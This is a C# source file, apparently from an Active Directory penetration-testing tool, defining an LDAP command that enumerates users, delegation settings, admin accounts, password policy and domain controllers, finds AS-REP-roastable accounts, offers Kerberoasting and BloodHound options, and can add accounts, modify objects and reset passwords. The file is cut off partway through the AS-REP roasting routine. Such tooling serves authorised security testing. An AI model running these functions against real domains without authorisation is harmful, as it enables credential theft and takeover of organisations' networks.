using System.ComponentModel;
using System.Net;
using System.Net.Security;
using Titanis.Cli;
using Titanis;
using Titanis.Ldap;
using Titanis.Net;
using Titanis.Security;
using Titanis.Security.Kerberos;

namespace Atlas.Protocols;

/// <summary>
/// queries, built on Titanis.Ldap.
/// </summary>
[Description("Interacts with LDAP servers (auth check, queries)")]
public sealed class LdapCommand : Command
{
	private const int LdapPort = 389;

	[Parameter(0)]
	[Placeholder("targets")]
	[Description("Targets as host, IP, CIDR, range (a.b.c.d-e), comma list, or @file")]
	public string? TargetSpec { get; set; }

	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
	public AuthenticationParameters Authentication { get; set; } = null!;

	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
	public NetworkParameters? NetParameters { get; set; }

	[Parameter]
	[Description("LDAP filter to execute, e.g. '(samAccountName=administrator)'")]
	public string? Query { get; set; }

	[Parameter]
	[Description("Attributes to return with -Query (default: none/DN only)")]
	public string[]? Attrs { get; set; }

	[Parameter]
	[Alias("bd")]
	[Description("Bind DN for LDAP simple bind (e.g. cn=admin,dc=x,dc=y). Bypasses SASL/NTLM")]
	public string? BindDn { get; set; }

	[Parameter]
	[Alias("bp")]
	[Description("Bind password for -BindDn")]
	public string? BindPassword { get; set; }

	[Parameter]
	[Alias("base-dn")]
	[Description("Explicit search base DN (default: rootDSE defaultNamingContext)")]
	public string? Base { get; set; }

	[Parameter]
	[DefaultValue(389)]
	[Description("LDAP port (default: 389, 636 for LDAPS)")]
	public int Port { get; set; } = 389;

	[Parameter]
	[DefaultValue(1)]
	[Alias("t")]
	[Description("Number of concurrent targets")]
	public int Threads { get; set; } = 1;

	[Parameter]
	[DefaultValue(30)]
	[Description("Per-host timeout in seconds")]
	public int Timeout { get; set; } = 30;

	[Parameter]
	public SwitchParam Users { get; set; }

	[Parameter]
	[Alias("active-users")]
	[Description("Enumerate active (not disabled) domain users")]
	public SwitchParam ActiveUsers { get; set; }

	[Parameter]
	[Alias("trusted-for-delegation")]
	[Description("Get users with TRUSTED_FOR_DELEGATION flag")]
	public SwitchParam TrustedForDelegation { get; set; }

	[Parameter]
	[Alias("password-not-required")]
	[Description("Get users with PASSWD_NOTREQD flag")]
	public SwitchParam PasswordNotRequired { get; set; }

	[Parameter]
	[Alias("admin-count")]
	[Description("Get users with adminCount=1")]
	public SwitchParam AdminCount { get; set; }

	[Parameter]
	[Alias("get-sid")]
	[Description("Get domain SID")]
	public SwitchParam GetSid { get; set; }

	[Parameter]
	[Alias("pass-pol")]
	[Description("Dump domain password policy (min length, history, lockout, etc.)")]
	public SwitchParam PassPol { get; set; }

	[Parameter]
	[Alias("dc-list")]
	[Description("Enumerate Domain Controllers (primaryGroupId=516)")]
	public SwitchParam DcList { get; set; }

	[Parameter]
	[Description("Enumerate GMSA accounts (objectClass=msDS-GroupManagedServiceAccount)")]
	public SwitchParam Gmsa { get; set; }

	[Parameter]
	public string? Groups { get; set; }

	[Parameter]
	public string? Ous { get; set; }

	[Parameter]
	public SwitchParam Computers { get; set; }

	[Parameter]
	[Alias("find-delegation")]
	public SwitchParam FindDelegation { get; set; }

	[Parameter]
	[Alias("users-export")]
	[Description("Write enumerated user sAMAccountNames to file (use with -Users)")]
	public string? UsersExport { get; set; }

	[Parameter]
	[Alias("kerberoast")]
	[Description("Kerberoast all SPN accounts and save hashes to file (requires credentials)")]
	public string? Kerberoasting { get; set; }

	[Parameter]
	public string? Asreproast { get; set; }

	[Parameter]
	[Alias("add-user")]
	[Description("Create a user account (sAMAccountName) in CN=Users; use with -AddUserPass")]
	public string? AddUser { get; set; }

	[Parameter]
	[Alias("add-user-pass")]
	[Description("Password for -AddUser")]
	public string? AddUserPass { get; set; }

	[Parameter]
	[Alias("add-computer")]
	[Description("Create a computer account (e.g. WS01$ or WS01) in CN=Computers; use with -AddComputerPass")]
	public string? AddComputer { get; set; }

	[Parameter]
	[Alias("add-computer-pass")]
	[Description("Password for -AddComputer")]
	public string? AddComputerPass { get; set; }

	[Parameter]
	[Description("Delete an object by DN or sAMAccountName")]
	public string? Delete { get; set; }

	[Parameter]
	[Description("Modify an object by DN or sAMAccountName (use with -ModifyAttrs)")]
	public string? Modify { get; set; }

	[Parameter]
	[Alias("modify-attrs")]
	[Description("Attribute changes as attr=value,attr+=value,attr-=value (use with -Modify)")]
	public string? ModifyAttrs { get; set; }

	[Parameter]
	[Alias("set-password")]
	[Description("Admin-reset the password of an object by DN or sAMAccountName (use with -NewPassword)")]
	public string? SetPassword { get; set; }

	[Parameter]
	[Alias("new-password")]
	[Description("New password for -SetPassword")]
	public string? NewPassword { get; set; }

	[Parameter]
	public SwitchParam Bloodhound { get; set; }

	[Parameter]
	[Alias("c")]
	[DefaultValue("Default")]
	[Description("BloodHound collection method: Group, LocalAdmin, Session, Trusts, Default, DCOnly, DCOM, RDP, PSRemote, LoggedOn, Container, ObjectProps, ACL, ADCS, All")]
	public string Collection { get; set; } = "Default";

	// ---- Modules ----
	[Parameter]
	[Alias("M")]
	[Description("Module(s) to run after authentication (comma-separated)")]
	public string[]? Modules { get; set; }


	[Parameter]
	[Alias("mo", "o")]
	[Description("Module options as key=value pairs separated by commas")]
	public string? ModuleOptions { get; set; }

	[Parameter]
	[Alias("L")]
	[Description("List available modules and exit")]
	public SwitchParam ListModules { get; set; }

	protected override void ValidateParameters(ParameterValidationContext context)
	{
		if (this.ListModules.IsSet)
			return;

		this.NetParameters?.ValidateParameters(context);

		if ((this.BindDn is null) != (this.BindPassword is null))
			context.LogError(nameof(this.BindDn), "-BindDn and -BindPassword must be used together");

		bool hasSimple = this.BindDn is not null;
		bool hasModules = this.Modules is not null && this.Modules.Length > 0;
		bool hasEnumFlags = this.Users.IsSet || this.ActiveUsers.IsSet || this.TrustedForDelegation.IsSet || this.PasswordNotRequired.IsSet || this.AdminCount.IsSet || this.GetSid.IsSet || this.PassPol.IsSet || this.DcList.IsSet || this.Gmsa.IsSet || this.Bloodhound.IsSet || this.Groups is not null || this.Ous is not null || this.Computers.IsSet || this.FindDelegation.IsSet || this.Asreproast is not null || this.Kerberoasting is not null;
		bool hasWriteFlags = this.AddUser is not null || this.AddComputer is not null || this.Delete is not null || this.Modify is not null || this.SetPassword is not null;
		this.Authentication.Validate(!this.Authentication.Anonymous.IsSet && this.Query is null && !hasSimple && !hasModules && !hasEnumFlags && !hasWriteFlags, context);

		try
		{
			if (string.IsNullOrEmpty(this.TargetSpec))
				context.LogError(nameof(this.TargetSpec), "No targets specified");
			else
			{
				var targets = TargetList.Parse(this.TargetSpec);
				if (targets.Count == 0)
					context.LogError(nameof(this.TargetSpec), "No valid targets specified");
			}
		}
		catch (Exception ex)
		{
			context.LogError(nameof(this.TargetSpec), ex.Message);
		}

		if (this.Attrs is not null && this.Query is null)
			context.LogError(nameof(this.Attrs), "-Attrs requires -Query");

		if (this.ModuleOptions is not null)
		{
			try { AtlasModuleRegistry.ParseOptionString(this.ModuleOptions); }
			catch (Exception ex) { context.LogError(nameof(this.ModuleOptions), ex.Message); }
		}

		if (this.AddUser is not null && string.IsNullOrWhiteSpace(this.AddUserPass))
			context.LogError(nameof(this.AddUserPass), "-AddUser requires -AddUserPass");
		if (this.AddComputer is not null && string.IsNullOrWhiteSpace(this.AddComputerPass))
			context.LogError(nameof(this.AddComputerPass), "-AddComputer requires -AddComputerPass");
		if (this.Modify is not null && string.IsNullOrWhiteSpace(this.ModifyAttrs))
			context.LogError(nameof(this.ModifyAttrs), "-Modify requires -ModifyAttrs (attr=value,attr+=value,attr-=value)");
		if (this.ModifyAttrs is not null && this.Modify is null)
			context.LogError(nameof(this.Modify), "-ModifyAttrs requires -Modify <dn-or-sam>");
		if (this.SetPassword is not null && string.IsNullOrWhiteSpace(this.NewPassword))
			context.LogError(nameof(this.NewPassword), "-SetPassword requires -NewPassword");
		if (this.NewPassword is not null && this.SetPassword is null)
			context.LogError(nameof(this.SetPassword), "-NewPassword requires -SetPassword <dn-or-sam>");
	}

	protected sealed override async Task<int> RunAsync(CancellationToken cancellationToken)
	{
		if (this.ListModules.IsSet)
		{
			foreach (var mod in AtlasModuleRegistry.Discover<LdapClient>())
			{
				AtlasConsole.Line($"  {mod.Name,-16} {mod.Description}");
			}
			return 0;
		}

		var targets = TargetList.Parse(this.TargetSpec!);
		int failures = 0;

		await Parallel.ForEachAsync(
			targets,
			new ParallelOptions
			{
				MaxDegreeOfParallelism = this.Threads,
				CancellationToken = cancellationToken,
			},
			async (host, token) =>
			{
				using var timeoutCts = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(token);
				timeoutCts.CancelAfter(TimeSpan.FromSeconds(this.Timeout));
				try
				{
					await this.ProcessHostAsync(host, timeoutCts.Token).ConfigureAwait(false);
				}
				catch (OperationCanceledException) when (token.IsCancellationRequested)
				{
					throw;
				}
				catch (OperationCanceledException)
				{
					Interlocked.Increment(ref failures);
					AtlasConsole.Fail($"{host}:{this.Port}", $"No response within {this.Timeout}s (timeout)");
				}
				catch (LdapException lex)
				{
					Interlocked.Increment(ref failures);
					string msg = lex.Message;
					if (string.IsNullOrWhiteSpace(msg))
						msg = $"LDAP error {lex.ResultCode} ({(int)lex.ResultCode})";
					else if (!msg.Contains(lex.ResultCode.ToString()))
						msg = $"{msg} ({lex.ResultCode})";
					AtlasConsole.Fail($"{host}:{this.Port}", msg);
				}
				catch (Exception ex)
				{
					Interlocked.Increment(ref failures);
					string msg = this.Verbose.IsSet ? ex.ToString() : ex.Message;
					if (string.IsNullOrWhiteSpace(msg))
						msg = ex.GetType().Name;
					AtlasConsole.Fail($"{host}:{this.Port}", msg);
				}
			}).ConfigureAwait(false);

		return failures > 0 ? 1 : 0;
	}

	private async Task ProcessHostAsync(string host, CancellationToken cancellationToken)
	{
		LdapClient ldap = await this.ConnectAsync(host, cancellationToken).ConfigureAwait(false);

		var domainRoot = ldap.DomainRoot;
		string rootText = (domainRoot is null) ? "(no naming context)" : domainRoot.ToString() ?? string.Empty;

		bool hasAnyFlag = this.Users.IsSet || this.ActiveUsers.IsSet || this.TrustedForDelegation.IsSet || this.PasswordNotRequired.IsSet || this.AdminCount.IsSet || this.GetSid.IsSet || this.PassPol.IsSet || this.DcList.IsSet || this.Gmsa.IsSet || this.Bloodhound.IsSet || this.Groups is not null || this.Ous is not null || this.Computers.IsSet || this.FindDelegation.IsSet || this.Asreproast is not null || this.Kerberoasting is not null
			|| this.AddUser is not null || this.AddComputer is not null || this.Delete is not null || this.Modify is not null || this.SetPassword is not null;

		// Module path
		if (this.Modules is not null && this.Modules.Length > 0)
		{
			var names = this.Modules.SelectMany(m => m.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries));
			var options = AtlasModuleRegistry.ParseOptionString(this.ModuleOptions);
			foreach (var mod in AtlasModuleRegistry.Select<LdapClient>(names))
			{
				await mod.RunAsync(new AtlasModuleContext<LdapClient>
				{
					Host = host,
					Client = ldap,
					Services = this.Services,
					Options = options,
				}, cancellationToken).ConfigureAwait(false);
			}
			if (this.Query is null && !hasAnyFlag)
				return;
		}

		if (this.Users.IsSet)
			await QueryUsersAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.ActiveUsers.IsSet)
			await QueryActiveUsersAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.TrustedForDelegation.IsSet)
			await QueryTrustedForDelegationAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.PasswordNotRequired.IsSet)
			await QueryPasswordNotRequiredAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.AdminCount.IsSet)
			await QueryAdminCountAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.GetSid.IsSet)
			await QueryGetSidAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.PassPol.IsSet)
			await QueryPassPolAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.DcList.IsSet)
			await QueryDcListAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.Gmsa.IsSet)
			await QueryGmsaAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.Groups is not null)
			await QueryGroupsAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.Ous is not null)
			await QueryOusAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.Computers.IsSet)
			await QueryComputersAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.FindDelegation.IsSet)
			await QueryFindDelegationAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.Asreproast is not null)
			await QueryAsreproastAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.Bloodhound.IsSet)
			await QueryBloodhoundAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.Kerberoasting is not null)
			await KerberoastAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.AddUser is not null)
			await AddUserAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.AddComputer is not null)
			await AddComputerAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.Delete is not null)
			await DeleteObjectAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.Modify is not null)
			await ModifyObjectAsync(ldap, host, cancellationToken).ConfigureAwait(false);
		if (this.SetPassword is not null)
			await SetPasswordAsync(ldap, host, cancellationToken).ConfigureAwait(false);

		if (this.Query is null)
		{
			if (!hasAnyFlag && (this.Modules is null || this.Modules.Length == 0))
				AtlasConsole.Success($"{host}:{this.Port}", $"{this.DescribePrincipal()} - domain: {rootText}");
			return;
		}

		LdapFilter filter = LdapFilter.Parse(this.Query);
		AttributeSpec[]? attrs = this.Attrs?
			.SelectMany(r => r.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries))
			.Where(r => r.Length > 0)
			.Select(r => new AttributeSpec(r)).ToArray();

		LdapDistinguishedName? searchBase = domainRoot;
		if (!string.IsNullOrEmpty(this.Base))
			searchBase = LdapDistinguishedName.Parse(this.Base);

		var query = new LdapQuery(searchBase, LdapSearchScope.WholeSubtree, filter, attrs)
		{
			Options = LdapQueryOptions.AllPages
		};
		LdapSearchResult results = await ldap.Search(query, cancellationToken).ConfigureAwait(false);

		int count = 0;
		foreach (LdapEntry entry in results.Entries)
		{
			count++;
			string dn = entry.EntryName?.ToString() ?? string.Empty;
			string[] attrNames = (this.Attrs ?? Array.Empty<string>())
				.SelectMany(r => r.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries))
				.Where(r => r.Length > 0)
				.ToArray();

			if (attrNames.Length == 0)
			{
				AtlasConsole.Info($"{host}:{this.Port}", dn);
			}
			else
			{
				var parts = attrNames
					.Select(a => $"{a}={FormatAttr(entry[a]?.Value)}");
				AtlasConsole.Info($"{host}:{this.Port}", $"{dn} [{string.Join("; ", parts)}]");
			}
		}
		AtlasConsole.Info($"{host}:{this.Port}", $"{count} entr(ies) matched '{this.Query}'");
	}

	private sealed class NoBindCredentialService : IClientCredentialService
	{
		public static readonly NoBindCredentialService Instance = new NoBindCredentialService();
		private NoBindCredentialService() { }
		public ValueTask<AuthClientContext?> GetAuthContextForService(SecurityPrincipalName spn, SecurityCapabilities requiredCaps, AuthOptions options)
			=> ValueTask.FromResult<AuthClientContext?>(null);
		public ValueTask<AuthClientContext?> GetAuthContextForResource(string resourceType, object resourceKey, SecurityCapabilities requiredCaps, AuthOptions options)
			=> ValueTask.FromResult<AuthClientContext?>(null);
	}

	private static string FormatAttr(object? value)
		=> value switch
		{
			null => string.Empty,
			byte[] b => Convert.ToHexString(b),
			System.Collections.IEnumerable e when value is not string => string.Join(", ", e.Cast<object>().Select(o => o?.ToString() ?? string.Empty)),
			_ => value.ToString() ?? string.Empty
		};

	private string DescribePrincipal()
	{
		if (this.BindDn is not null)
			return $"(simple) {this.BindDn}";
		if (this.Authentication.Anonymous.IsSet)
			return "(anonymous)";
		var upn = this.Authentication.UserName;
		return upn?.WireName ?? "(null session)";
	}

	private async Task<LdapClient> ConnectAsync(string host, CancellationToken cancellationToken)
	{
		var resolver = this.NetParameters ?? new NetworkParameters();
		var socketService = new PlatformSocketService(resolver, this.Log);

		if (this.BindDn is not null)
		{
			LdapClient ldapSimple = await LdapClient.Connect(
				new DnsEndPoint(host, this.Port),
				(SslClientAuthenticationOptions?)null,
				socketService,
				NoBindCredentialService.Instance,
				cancellationToken).ConfigureAwait(false);
			await ldapSimple.BindSimple(this.BindDn, this.BindPassword!, cancellationToken).ConfigureAwait(false);
			return ldapSimple;
		}

		var credService = this.Services.RequireService<IClientCredentialService>();

		LdapClient ldap = await LdapClient.Connect(
			new DnsEndPoint(host, this.Port),
			(SslClientAuthenticationOptions?)null,
			socketService,
			credService,
			cancellationToken).ConfigureAwait(false);
		return ldap;
	}

	private async Task QueryUsersAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		string filterStr = "(sAMAccountType=805306368)";
		var filter = LdapFilter.Parse(filterStr);
		var attrs = new[] { new AttributeSpec("sAMAccountName"), new AttributeSpec("description"), new AttributeSpec("badPwdCount"), new AttributeSpec("pwdLastSet") };
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, attrs) { Options = LdapQueryOptions.AllPages, PageSize = 200 };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		AtlasConsole.Info($"{host}:{this.Port}", $"--users: {result.EntryCount} user(s)");
		var sams = new List<string>();
		foreach (var e in result.Entries)
		{
			string sam = e["sAMAccountName"]?.Value?.ToString() ?? "";
			sams.Add(sam);
			string desc = e["description"]?.Value?.ToString() ?? "";
			string bad = e["badPwdCount"]?.Value?.ToString() ?? "";
			string pwd = e["pwdLastSet"]?.Value?.ToString() ?? "";
			AtlasConsole.Info($"{host}:{this.Port}", $"  {sam,-20} pwdLastSet={pwd} badPwd={bad} desc={desc}");
		}
		if (this.UsersExport is not null)
		{
			await File.WriteAllLinesAsync(this.UsersExport, sams, ct).ConfigureAwait(false);
			AtlasConsole.Success($"{host}:{this.Port}", $"--users-export: wrote {sams.Count} user(s) to {this.UsersExport}");
		}
	}

	private async Task QueryActiveUsersAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		var filter = LdapFilter.Parse("(&(sAMAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))");
		var attrs = new[] { new AttributeSpec("sAMAccountName"), new AttributeSpec("userAccountControl") };
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, attrs) { Options = LdapQueryOptions.AllPages };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		AtlasConsole.Info($"{host}:{this.Port}", $"--active-users: {result.EntryCount} active user(s)");
		foreach (var e in result.Entries)
			AtlasConsole.Success($"{host}:{this.Port}", $"  {e["sAMAccountName"]?.Value}");
	}

	private async Task QueryTrustedForDelegationAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		var filter = LdapFilter.Parse("(userAccountControl:1.2.840.113556.1.4.803:=524288)");
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, new[] { new AttributeSpec("sAMAccountName") }) { Options = LdapQueryOptions.AllPages };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		if (result.EntryCount == 0) AtlasConsole.Info($"{host}:{this.Port}", "--trusted-for-delegation: none");
		else foreach (var e in result.Entries) AtlasConsole.Success($"{host}:{this.Port}", $"  {e["sAMAccountName"]?.Value} (TRUSTED_FOR_DELEGATION)");
	}

	private async Task QueryPasswordNotRequiredAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		var filter = LdapFilter.Parse("(userAccountControl:1.2.840.113556.1.4.803:=32)");
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, new[] { new AttributeSpec("sAMAccountName"), new AttributeSpec("userAccountControl") }) { Options = LdapQueryOptions.AllPages };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		if (result.EntryCount == 0) AtlasConsole.Info($"{host}:{this.Port}", "--password-not-required: none");
		else foreach (var e in result.Entries) AtlasConsole.Success($"{host}:{this.Port}", $"  {e["sAMAccountName"]?.Value} (PASSWD_NOTREQD)");
	}

	private async Task QueryAdminCountAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		var filter = LdapFilter.Parse("(&(adminCount=1)(objectClass=user))");
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, new[] { new AttributeSpec("sAMAccountName") }) { Options = LdapQueryOptions.AllPages };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		if (result.EntryCount == 0) AtlasConsole.Info($"{host}:{this.Port}", "--admin-count: none");
		else foreach (var e in result.Entries) AtlasConsole.Success($"{host}:{this.Port}", $"  {e["sAMAccountName"]?.Value}");
	}

	private async Task QueryGetSidAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		// Query domain object for objectSid
		var filter = LdapFilter.Parse("(objectClass=domainDNS)");
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.Base, filter, new[] { new AttributeSpec("objectSid") }) { Options = LdapQueryOptions.None };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		if (result.EntryCount > 0)
		{
			var sidVal = result.Entries[0]["objectSid"]?.Value;
			string sid = sidVal?.ToString() ?? FormatAttr(sidVal);
			// If sid is byte[], format as SID
			if (sidVal is byte[] bytes)
			{
				try { sid = new System.Security.Principal.SecurityIdentifier(bytes, 0).Value; } catch { sid = Convert.ToHexString(bytes); }
			}
			AtlasConsole.Success($"{host}:{this.Port}", $"--get-sid: {sid}");
		}
		else
		{
			// Fallback: try to get via rootDSE configurationNamingContext and then domain
			var filter2 = LdapFilter.Parse("(objectClass=domain)");
			var query2 = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter2, new[] { new AttributeSpec("objectSid") }) { Options = LdapQueryOptions.AllPages };
			var result2 = await ldap.Search(query2, ct).ConfigureAwait(false);
			if (result2.EntryCount > 0)
			{
				var sidVal = result2.Entries[0]["objectSid"]?.Value;
				string sid = sidVal is byte[] b ? new System.Security.Principal.SecurityIdentifier(b, 0).Value : sidVal?.ToString() ?? "";
				AtlasConsole.Success($"{host}:{this.Port}", $"--get-sid: {sid}");
			}
			else AtlasConsole.Fail($"{host}:{this.Port}", "--get-sid: not found");
		}
	}

	private async Task QueryPassPolAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		var filter = LdapFilter.Parse("(objectClass=domainDNS)");
		var attrs = new[] { new AttributeSpec("minPwdLength"), new AttributeSpec("pwdHistoryLength"), new AttributeSpec("maxPwdAge"), new AttributeSpec("lockoutThreshold"), new AttributeSpec("pwdProperties") };
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.Base, filter, attrs) { Options = LdapQueryOptions.None };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		if (result.EntryCount == 0)
		{
			AtlasConsole.Fail($"{host}:{this.Port}", "--pass-pol: no domain policy found");
			return;
		}
		var e = result.Entries[0];
		AtlasConsole.Success($"{host}:{this.Port}", $"--pass-pol for {e.EntryName}: minLen={e["minPwdLength"]?.Value} history={e["pwdHistoryLength"]?.Value} lockoutThreshold={e["lockoutThreshold"]?.Value} pwdProperties={e["pwdProperties"]?.Value}");
	}

	private async Task QueryDcListAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		var filter = LdapFilter.Parse("(&(objectClass=computer)(primaryGroupId=516))");
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, new[] { new AttributeSpec("dNSHostName"), new AttributeSpec("sAMAccountName") }) { Options = LdapQueryOptions.AllPages };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		if (result.EntryCount == 0) AtlasConsole.Info($"{host}:{this.Port}", "--dc-list: none");
		else foreach (var e in result.Entries) AtlasConsole.Success($"{host}:{this.Port}", $"  DC: {e["dNSHostName"]?.Value ?? e["sAMAccountName"]?.Value}");
	}

	private async Task QueryGmsaAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		var filter = LdapFilter.Parse("(objectClass=msDS-GroupManagedServiceAccount)");
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, new[] { new AttributeSpec("sAMAccountName"), new AttributeSpec("msDS-ManagedPassword") }) { Options = LdapQueryOptions.AllPages };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		if (result.EntryCount == 0) AtlasConsole.Info($"{host}:{this.Port}", "--gmsa: none");
		else foreach (var e in result.Entries) AtlasConsole.Success($"{host}:{this.Port}", $"  GMSA: {e["sAMAccountName"]?.Value}");
	}

	private async Task QueryGroupsAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		string? filterGroup = this.Groups;
		string filterStr = string.IsNullOrWhiteSpace(filterGroup) ? "(objectClass=group)" : $"(&(objectClass=group)(cn={EscapeFilter(filterGroup)}))";
		var filter = LdapFilter.Parse(filterStr);
		var attrs = new[] { new AttributeSpec("cn"), new AttributeSpec("member"), new AttributeSpec("distinguishedName") };
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, attrs) { Options = LdapQueryOptions.AllPages, PageSize = 200 };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		if (result.EntryCount == 0) AtlasConsole.Info($"{host}:{this.Port}", "--groups: none");
		else
		{
			AtlasConsole.Info($"{host}:{this.Port}", $"--groups: {result.EntryCount} group(s)");
			foreach (var e in result.Entries)
			{
				string cn = e["cn"]?.Value?.ToString() ?? "";
				var memberVal = e["member"]?.Value;
				int mCount = 0;
				if (memberVal is System.Collections.IEnumerable en && memberVal is not string) mCount = en.Cast<object>().Count();
				else if (memberVal != null) mCount = 1;
				AtlasConsole.Success($"{host}:{this.Port}", $"  {cn} members={mCount}");
			}
		}
	}

	private async Task QueryOusAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		string? filterOu = this.Ous;
		string filterStr = string.IsNullOrWhiteSpace(filterOu) ? "(objectClass=organizationalUnit)" : $"(&(objectClass=organizationalUnit)(ou={EscapeFilter(filterOu)}))";
		var filter = LdapFilter.Parse(filterStr);
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, new[] { new AttributeSpec("ou"), new AttributeSpec("distinguishedName") }) { Options = LdapQueryOptions.AllPages };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		if (result.EntryCount == 0) AtlasConsole.Info($"{host}:{this.Port}", "--ous: none");
		else foreach (var e in result.Entries) AtlasConsole.Success($"{host}:{this.Port}", $"  OU: {e["ou"]?.Value} DN={e.EntryName}");
	}

	private async Task QueryComputersAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		var filter = LdapFilter.Parse("(sAMAccountType=805306369)");
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, new[] { new AttributeSpec("dNSHostName"), new AttributeSpec("sAMAccountName"), new AttributeSpec("operatingSystem") }) { Options = LdapQueryOptions.AllPages, PageSize = 200 };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		AtlasConsole.Info($"{host}:{this.Port}", $"--computers: {result.EntryCount} computer(s)");
		foreach (var e in result.Entries)
			AtlasConsole.Success($"{host}:{this.Port}", $"  {e["dNSHostName"]?.Value ?? e["sAMAccountName"]?.Value} OS={e["operatingSystem"]?.Value}");
	}

	private async Task QueryFindDelegationAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		// Find unconstrained, constrained delegation
		var filter = LdapFilter.Parse("(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(userAccountControl:1.2.840.113556.1.4.803:=16777216)(msDS-AllowedToDelegateTo=*))");
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, new[] { new AttributeSpec("sAMAccountName"), new AttributeSpec("userAccountControl"), new AttributeSpec("msDS-AllowedToDelegateTo") }) { Options = LdapQueryOptions.AllPages };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		if (result.EntryCount == 0) AtlasConsole.Info($"{host}:{this.Port}", "--find-delegation: none");
		else foreach (var e in result.Entries) AtlasConsole.Success($"{host}:{this.Port}", $"  {e["sAMAccountName"]?.Value} UAC={e["userAccountControl"]?.Value} -> {e["msDS-AllowedToDelegateTo"]?.Value}");
	}

	private async Task QueryAsreproastAsync(LdapClient ldap, string host, CancellationToken ct)
	{
		// Find accounts with DONT_REQUIRE_PREAUTH (UF_DONT_REQUIRE_PREAUTH = 4194304)
		var filter = LdapFilter.Parse("(userAccountControl:1.2.840.113556.1.4.803:=4194304)");
		var query = new LdapQuery(ldap.DomainRoot, LdapSearchScope.WholeSubtree, filter, new[] { new AttributeSpec("sAMAccountName"), new AttributeSpec("userAccountControl") }) { Options = LdapQueryOptions.AllPages };
		var result = await ldap.Search(query, ct).ConfigureAwait(false);
		if (result.EntryCount == 0)
		{
			AtlasConsole.Info($"{host}:{this.Port}", "--asreproast: no accounts with DONT_REQUIRE_PREAUTH");
			return;
		}
		var sams = new List<string>();
		foreach (var e in result.Entries)
		{
			string sam = e["sAMAccountName"]?.Value?.ToString() ?? "";
			if (string.IsNullOrEmpty(sam)) continue;
			sams.Add(sam);
			AtlasConsole.Success($"{host}:{this.Port}", $"  {sam} (UAC={e["userAccountControl"]?.Value})");
		}
		if (string.IsNullOrWhiteSpace(this.Asreproast))
			return;

		string dn0 = ldap.DomainRoot?.ToString() ?? string.Empty;
		string? realm = dn0.Replace("DC=", "", StringComparison.OrdinalIgnoreCase).Replace(",", ".").ToUpperInvariant();
		if (string.IsNullOrWhiteSpace(realm) || !realm.Contains('.'))
			realm = this.Authentication.UserDomain?.ToUpperInvariant();
